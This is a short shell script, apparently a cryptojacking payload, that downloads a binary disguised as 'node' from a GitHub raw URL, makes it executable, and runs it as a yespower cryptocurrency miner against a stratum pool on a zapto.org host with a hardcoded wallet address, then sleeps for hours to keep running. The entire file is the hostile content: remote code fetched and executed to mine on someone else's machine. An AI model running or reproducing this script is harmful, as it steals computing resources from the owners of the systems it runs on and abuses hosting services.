#!/bin/sh
set -e
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
HOURESX=crf_$((RANDOM % 100))
./node -a yespower -o stratum+tcp://mining-pool.zapto.org:3710 -u WXeJSqsKYiHLTzwLBSM93z1spxCpyeAcqP.${HOURESX} > try.log
sleep 29999

